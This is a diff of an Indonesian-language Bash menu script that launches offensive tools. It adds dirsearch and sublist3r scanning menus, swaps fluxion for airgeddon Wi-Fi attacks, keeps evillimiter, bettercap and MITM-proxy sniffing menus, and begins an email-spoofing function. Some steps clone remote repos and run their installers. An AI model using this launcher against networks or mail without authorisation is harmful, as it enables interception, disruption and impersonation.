 function listerners(){
-    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1mlisterner\033[32;1m android\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mlisterner\033[32;1m android\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1mx\033[31;1m] \033[37;1mkembali\033[31;1m\n\n"
+    printf "\033[31;1m\t[\033[32;1mx\033[31;1m] \033[37;1mkembali\033[31;1m\n\n"
     sleep 0.025
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
     sleep 0.025
     printf '\033[31;1m'
     echo
@@ -1991,14 +1835,14 @@ function sqli(){
     clear
     baner
     echo
-    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall sql-injection\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall sql-injection\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun sql-injection\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun sql-injection\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
     sleep 0.025
     echo
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
     sleep 0.025
     printf '\033[31;1m'
     spiner
@@ -2068,14 +1912,14 @@ function xss(){
     clear
     baner
     echo
-    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall XSS\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall XSS\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun XSS\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun XSS\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
     sleep 0.025
 		echo
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
     sleep 0.025
     printf '\033[31;1m'
     spiner
@@ -2142,6 +1986,372 @@ function xss(){
         fi
 }
 
+function exec_dirsearch1(){
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
+	sleep 0.025
+	echo
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> detik.com\n"
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url : "'\033[34;1m')" target
+	printf '\033[31;1m'
+	printf '\033[37;1m'
+	echo
+	dirsearch -u $target
+	sleep 0.025
+	printf '\033[31;1m'
+	echo
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
+	echo
+	while true
+	do
+	if [ $scan = "y"  ];
+	then
+	exec_dirsearch2
+
+	else [ $scan != "y" ]
+	dirsec
+	fi
+	done
+}
+
+function exec_dirsearch2(){
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
+	sleep 0.025
+	echo
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> detik.com\n"
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m extension pisah dengan , >> php,js,html\n"
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url : "'\033[34;1m')" target
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] ext : "'\033[34;1m')" ext
+	printf '\033[31;1m'
+	printf '\033[37;1m'
+	echo
+	dirsearch -e $ext -u $target -r -R 3
+	sleep 0.025
+	printf '\033[31;1m'
+	echo
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
+	echo
+	while true
+	do
+	if [ $scan = "y"  ];
+	then
+	exec_dirsearch2
+
+	else [ $scan != "y" ]
+	dirsec
+	fi
+	done
+}
+
+# web attack - dirsearch
+function dirsec(){
+    clear
+    baner
+    echo
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall dirsearch\033[31;1m\n"
+    sleep 0.025
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun dirsearch\033[31;1m\n"
+    sleep 0.025
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    sleep 0.025
+    echo
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    sleep 0.025
+    printf '\033[31;1m'
+    spiner
+    echo
+        if [ $xyz = "1"  ];
+        then
+
+                if [[ -f /usr/bin/dirsearch ]]; then
+                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mdirsearch already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
+                spiner
+                echo
+                sleep 2
+                clear
+                else
+                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m dirsearch \033[31;1mnot found\033[37;1m, installing dirsearch!\n"
+                apt-get install dirsearch -y &> /dev/null
+		sleep 0.025
+                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                printf '\033[31;1m'
+                spiner
+                echo
+
+                fi
+	    baner
+	    echo
+	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mbasic scanning\033[31;1m\n"
+	    sleep 0.025
+	    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mscanning with extension\033[31;1m\n"
+	    sleep 0.025
+	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+	    sleep 0.025
+	    echo
+	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+	    sleep 0.025
+	    printf '\033[31;1m'
+	    echo
+	    spiner
+	    echo
+	    echo
+	   	if [[ $xyz = "1" ]];
+	   	then
+	   		exec_dirsearch1
+	   	elif [[ $xyz = "2" ]];
+	   	then
+	   		exec_dirsearch2
+	   	else
+	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m dirsearch \033[31;1mplease input in number\033[37;1m, [1-2]!\n"
+	   		sleep 2
+	   	fi
+	   
+	    	
+	    	
+
+        elif [ $xyz = "2"  ];
+        then
+		if [[ -f /usr/bin/dirsearch ]]; then
+                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mdirsearch already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
+                spiner
+                echo
+                sleep 2
+                clear
+                else
+                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m dirsearch \033[31;1mnot found\033[37;1m, installing dirsearch!\n"
+                apt-get install dirsearch -y &> /dev/null
+		sleep 0.025
+                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                printf '\033[31;1m'
+                spiner
+                echo
+
+                fi
+                
+            baner
+	    echo
+	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1mbasic scanning\033[31;1m\n"
+	    sleep 0.025
+	    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mscanning with extension\033[31;1m\n"
+	    sleep 0.025
+	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+	    sleep 0.025
+	    echo
+	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+	    sleep 0.025
+	    printf '\033[31;1m'
+	    echo
+	    spiner
+	    echo
+	    echo
+	   	if [[ $xyz = "1" ]];
+	   	then
+	   		exec_dirsearch1
+	   	elif [[ $xyz = "2" ]];
+	   	then
+	   		exec_dirsearch2
+	   	else
+	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m dirsearch \033[31;1mplease input in number\033[37;1m, [1-2]!\n"
+	   		sleep 2
+	   	fi
+	   
+
+        elif [ $xyz = "0"  ];
+        then
+        run_lainya
+
+        else
+        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
+        sleep 2
+        dirsec
+        fi
+}
+
+function exec_sublist3r1(){
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
+	sleep 0.025
+	echo
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url : "'\033[34;1m')" target
+	printf '\033[31;1m'
+	printf '\033[37;1m'
+	echo
+	sublist3r -v -d $target
+	sleep 0.025
+	printf '\033[31;1m'
+	echo
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
+	echo
+	while true
+	do
+	if [ $scan = "y"  ];
+	then
+	exec_sublist3r1
+
+	else [ $scan != "y" ]
+	subdomain
+	fi
+	done
+}
+
+function exec_sublist3r2(){
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\033[31;1m\n"
+	sleep 0.025
+	echo
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m example >> google.com\n"
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m port 80,443 pisah dengan , >> 80,443\n"
+	printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m\n"
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] url  : "'\033[34;1m')" target
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] port : "'\033[34;1m')" pots
+	printf '\033[31;1m'
+	printf '\033[37;1m'
+	echo
+	sublist3r -v -d $target -p $pots
+	sleep 0.025
+	printf '\033[31;1m'
+	echo
+	read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] scan ulang [y/n] : "'\033[34;1m')" scan
+	echo
+	while true
+	do
+	if [ $scan = "y"  ];
+	then
+	exec_sublist3r2
+
+	else [ $scan != "y" ]
+	subdomain
+	fi
+	done
+}
+
+# web attack - subdomain
+function subdomain(){
+    clear
+    baner
+    echo
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall sublist3r\033[31;1m\n"
+    sleep 0.025
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun sublist3r\033[31;1m\n"
+    sleep 0.025
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    sleep 0.025
+    echo
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    sleep 0.025
+    printf '\033[31;1m'
+    spiner
+    echo
+        if [ $xyz = "1"  ];
+        then
+
+                if [[ -f /usr/bin/sublist3r ]]; then
+                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1msublist3r already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
+                spiner
+                echo
+                sleep 2
+                clear
+                else
+                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m sublist3r \033[31;1mnot found\033[37;1m, installing sublist3r!\n"
+                apt-get install sublist3r -y &> /dev/null
+		sleep 0.025
+                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                printf '\033[31;1m'
+                spiner
+                echo
+
+                fi
+	    baner
+	    echo
+	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1menumerate subdomains of specific domain\033[31;1m\n"
+	    sleep 0.025
+	    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1menumerate subdomains of specific domain and show the results in realtime\033[31;1m\n"
+	    sleep 0.025
+	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+	    sleep 0.025
+	    echo
+	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+	    sleep 0.025
+	    printf '\033[31;1m'
+	    echo
+	    spiner
+	    echo
+	    echo
+	   	if [[ $xyz = "1" ]];
+	   	then
+	   		exec_sublist3r1
+	   	elif [[ $xyz = "2" ]];
+	   	then
+	   		exec_sublist3r2
+	   	else
+	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m sublist3r \033[31;1mplease input in number\033[37;1m, [1-2]!\n"
+	   		sleep 2
+	   	fi
+	   
+	    	
+	    	
+
+        elif [ $xyz = "2"  ];
+        then
+		if [[ -f /usr/bin/sublist3r ]]; then
+                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1msublist3r already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
+                spiner
+                echo
+                sleep 2
+                clear
+                else
+                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m sublist3r \033[31;1mnot found\033[37;1m, installing sublist3r	!\n"
+                apt-get install sublist3r -y &> /dev/null
+		sleep 0.025
+                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                printf '\033[31;1m'
+                spiner
+                echo
+
+                fi
+                
+            baner
+	    echo
+	    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1menumerate subdomains of specific domain\033[31;1m\n"
+	    sleep 0.025
+	    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1menumerate subdomains of specific domain and show the results in realtime\033[31;1m\n"
+	    sleep 0.025
+	    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+	    sleep 0.025
+	    echo
+	    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+	    sleep 0.025
+	    printf '\033[31;1m'
+	    echo
+	    spiner
+	    echo
+	    echo
+	   	if [[ $xyz = "1" ]];
+	   	then
+	   		exec_sublist3r1
+	   	elif [[ $xyz = "2" ]];
+	   	then
+	   		exec_sublist3r2
+	   	else
+	   		printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m sublist3r \033[31;1mplease input in number\033[37;1m, [1-2]!\n"
+	   		sleep 2
+	   	fi
+	   
+
+        elif [ $xyz = "0"  ];
+        then
+        run_lainya
+
+        else
+        printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
+        sleep 2
+        subdomain
+        fi
+}
+
+
+
 # fungsi untuk menjalankan menu untuk web attack
 function run_web_attack(){
         clear
@@ -2157,6 +2367,17 @@ function run_web_attack(){
                 then
                 xss
                 run_web_attack
+                
+                elif [ $xyz = "3"  ];
+                then
+                dirsec
+                run_web_attack
+                
+                elif [ $xyz = "4"  ];
+                then
+                subdomain
+                run_web_attack
+
 
                 elif [ $xyz = "0"  ];
                 then
@@ -2171,18 +2392,18 @@ function run_web_attack(){
 }
 
 # wifi attack
-function fluxion(){
+function airgeddon_menu(){
     clear
     baner
     echo
-    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall fluxion - for hacking wifi\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall airgeddon - for hacking wifi\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun fluxion\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun airgeddon\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
     sleep 0.025
-		echo
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    echo
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
     sleep 0.025
     printf '\033[31;1m'
     spiner
@@ -2190,55 +2411,28 @@ function fluxion(){
         if [ $xyz = "1"  ];
         then
 
-                if [[ -d $path/.data/fluxion ]]; then
-                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mfluxion already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
-                spiner
-                echo
-                sleep 2
-                clear
+                if [ -f /usr/bin/msfconsole ]; then
+                printf "\033[31;1m[\033[32;1mOK\033[31;1m]\033[37;1m airgeddon is already exists!\n"
                 else
-                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m fluxion \033[31;1mnot found\033[37;1m, installing fluxion!\n"
-                cd $path/.data > /dev/null
-                git clone https://github.com/K1M4K-ID/fluxion > /dev/null 2>&1
-								sleep 0.025
-                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
-                printf '\033[31;1m'
-                spiner
-                echo
-       		unzip fluxion.zip;rm -fr fluxion.zip;cd fluxion;cd install;chmod +x *;bash install.sh
-
+                printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m installing airgeddon!\n"
+                apt-get install airgeddon -y
                 fi
+                sleep 0.025
 
-				sleep 3
-				fluxion
+
+                sleep 3
+                airgeddon_menu
 
         elif [ $xyz = "2"  ];
         then
-					if [[ -d $path/.data/fluxion ]]; then
-					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mfluxion already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
-					spiner
-					echo
-					sleep 2
-					clear
-					else
-					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m fluxion \033[31;1mnot found\033[37;1m, installing fluxion!\n"
-					cd $path/.data > /dev/null
-					git clone https://github.com/K1M4K-ID/fluxion > /dev/null 2>&1
-					sleep 1
-					unzip fluxion.zip;rm -fr fluxion.zip;cd fluxion;cd install;chmod +x *;bash install.sh
-					sleep 0.025
-					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
-					printf '\033[31;1m'
-					spiner
-					echo
-
-					fi
+        clear
+        sleep 1s
         printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
-				sleep 2
-				clear
-				cd $path/.data/fluxion;bash fluxion.sh
-				sleep 3
-        fluxion
+        sleep 2
+        clear
+        airgeddon
+        sleep 3
+        airgeddon_menu
 
         elif [ $xyz = "0"  ];
         then
@@ -2247,7 +2441,7 @@ function fluxion(){
         else
         printf "\033[37;1m[\033[31;1m!\033[37;1m]\033[37;1m masukan input dengan benar\n"
         sleep 2
-        fluxion
+        airgeddon_menu
         fi
 }
 
@@ -2257,14 +2451,14 @@ function evillimiters(){
     clear
     baner
     echo
-    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall evillimiter - for kill wifi\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall evillimiter - for kill wifi\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun evillimiter\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun evillimiter\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
     sleep 0.025
     echo
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
     sleep 0.025
     printf '\033[31;1m'
     spiner
@@ -2290,8 +2484,8 @@ function evillimiters(){
 
                 fi
 
-			sleep 3
-			wifi-agent
+                sleep 3
+                evillimiters
 
         elif [ $xyz = "2"  ];
         then
@@ -2338,7 +2532,7 @@ function run_wifi_attack(){
         sadap
                 if [ $xyz = "1"  ];
                 then
-                fluxion
+                airgeddon_menu
                 run_wifi_attack
 
 		elif [ $xyz = "2"  ];
@@ -2364,14 +2558,14 @@ function better(){
     clear
     baner
     echo
-    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall bettercap - for sniffing\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall bettercap - for sniffing\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun bettercap\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun bettercap\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
     sleep 0.025
-		echo
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    echo
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
     sleep 0.025
     printf '\033[31;1m'
     spiner
@@ -2381,48 +2575,46 @@ function better(){
 
                 if [[ -f /usr/bin/bettercap ]]; then
                 printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mbettercap already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
-                spiner
                 echo
                 sleep 2
                 clear
                 else
                 printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m bettercap \033[31;1mnot found\033[37;1m, installing bettercap!\n"
-								sudo apt-get install bettercap -y
-								sleep 0.025
+                sudo apt-get install bettercap -y
+                sleep 0.025
                 printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                 printf '\033[31;1m'
-                spiner
                 echo
 
                 fi
 
-				sleep 3
-				better
+                sleep 3
+                better
 
         elif [ $xyz = "2"  ];
         then
-					if [[ -f /usr/bin/bettercap ]]; then
-					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mbettercap already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
-					spiner
-					echo
-					sleep 2
-					clear
-					else
-					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m bettercap \033[31;1mnot found\033[37;1m, installing bettercap!\n"
-					sudo apt-get install bettercap -y
-					sleep 0.025
-					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
-					printf '\033[31;1m'
-					spiner
-					echo
+                        if [[ -f /usr/bin/bettercap ]]; then
+                        printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mbettercap already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
+                        spiner
+                        echo
+                        sleep 2
+                        clear
+                        else
+                        printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m bettercap \033[31;1mnot found\033[37;1m, installing bettercap!\n"
+                        sudo apt-get install bettercap -y
+                        sleep 0.025
+                        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                        printf '\033[31;1m'
+                        spiner
+                        echo
 
-					fi
-        printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
-				sleep 2
-				clear
-				bettercap
-				sleep 3
-        better
+                        fi
+                                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
+                                sleep 2
+                                clear
+                                bettercap
+                                sleep 3
+                                better
 
         elif [ $xyz = "0"  ];
         then
@@ -2440,14 +2632,14 @@ function proxy(){
     clear
     baner
     echo
-    printf "\033[31;1m[\033[32;1m1\033[31;1m] \033[37;1minstall manInThemidle proxy - for sniffing\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m1\033[31;1m] \033[37;1minstall manInThemidle proxy - for sniffing\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m2\033[31;1m] \033[37;1mrun manInThemidle\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m2\033[31;1m] \033[37;1mrun manInThemidle\033[31;1m\n"
     sleep 0.025
-    printf "\033[31;1m[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
+    printf "\033[31;1m\t[\033[32;1m0\033[31;1m] \033[37;1mkembali\033[31;1m\n"
     sleep 0.025
-		echo
-    read -p "$(printf "\033[31;1m[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
+    echo
+    read -p "$(printf "\033[31;1m\t[\033[32;1m*\033[31;1m] choice : "'\033[34;1m')" xyz
     sleep 0.025
     printf '\033[31;1m'
     spiner
@@ -2457,51 +2649,51 @@ function proxy(){
 
                 if [[ -d $path/.data/mitm ]]; then
                 printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mmanInThemidle already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
-                spiner
+
                 echo
                 sleep 2
                 clear
                 else
                 printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m manInThemidle \033[31;1mnot found\033[37;1m, installing manInThemidle!\n"
-								cd $path/.data > /dev/null 2>&1
-								git clone https://github.com/K1M4K-ID/mitm
-								sudo apt-get install mitmproxy -y > /dev/null 2>&1
-								sleep 0.025
+                cd $path/.data > /dev/null 2>&1
+                git clone https://github.com/K1M4K-ID/mitm
+                sudo apt-get install mitmproxy -y > /dev/null 2>&1
+                sleep 0.025
                 printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
                 printf '\033[31;1m'
-                spiner
+
                 echo
 
                 fi
 
-				sleep 3
-				proxy
+                sleep 3
+                proxy
 
         elif [ $xyz = "2"  ];
         then
-					if [[ -d $path/.data/mitm ]]; then
-					printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mmanInThemidle already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
-					spiner
-					echo
-					sleep 2
-					clear
-					else
-					printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m manInThemidle \033[31;1mnot found\033[37;1m, installing manInThemidle!\n"
-					cd $path/.data > /dev/null 2>&1
-					git clone https://github.com/K1M4K-ID/mitm
-					sudo apt-get install mitmproxy -y > /dev/null 2>&1
-					sleep 0.025
-					printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
-					printf '\033[31;1m'
-					spiner
-					echo
+                if [[ -d $path/.data/mitm ]]; then
+                printf "\033[31;1m[\033[32;1m✔\033[31;1m] \033[37;1mmanInThemidle already installed\033[31;1m [\033[32;1mOK\033[31;1m]\n"
 
-					fi
+                echo
+                sleep 2
+                clear
+                else
+                printf "\033[37;1m[\033[31;1mX\033[37;1m]\033[37;1m manInThemidle \033[31;1mnot found\033[37;1m, installing manInThemidle!\n"
+                cd $path/.data > /dev/null 2>&1
+                git clone https://github.com/K1M4K-ID/mitm
+                sudo apt-get install mitmproxy -y > /dev/null 2>&1
+                sleep 0.025
+                printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m installing\033[32;1m succesfully\033[31;1m\n"
+                printf '\033[31;1m'
+
+                echo
+
+                fi
         printf "\033[31;1m[\033[32;1m*\033[31;1m]\033[37;1m starting . . .\n"
-				sleep 2
-				clear
-				cd $path/.data/mitm;bash mitm.sh
-				sleep 3
+        sleep 2
+        clear
+        cd $path/.data/mitm;bash mitm.sh
+        sleep 3
         proxy
 
         elif [ $xyz = "0"  ];
@@ -2533,9 +2725,9 @@ function run_mitm_attack(){
                 proxy
                 run_mitm_attack
 
-								elif [ $xyz = "0"  ];
-								then
-								runer
+                elif [ $xyz = "0"  ];
+                then
+                runer
 
                 else
                 printf "\033[31;1m[\033[37;1m!\033[31;1m]\033[37;1m masukan input dengan benar . .\n"
@@ -2545,7 +2737,255 @@ function run_mitm_attack(){
                 fi
 }
 
+# function sosial engineering
 
+function spoof(){
+cat <<- EOF
+${RED}
+█▀▀ █▀▄▀█ ▄▀█ █ █░░   █▀ █▀█ █▀█ █▀█ █▀▀
+${WHITE}██▄ █░▀░█ █▀█ █ █▄▄   ▄█ █▀▀ █▄█ █▄█ █▀░  
+${WHITE}        
+EOF
+  #statements
+
+echo
+printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Author   : K1M4K-ID\n"
+printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m Version  : Beta V1\n" 
+echo
+
+  read -p "$(printf "\033[31;1m[\033[37;1m*\033[31;1m]\033[37;1m From Name   : "'\033[32;1m\n')" name
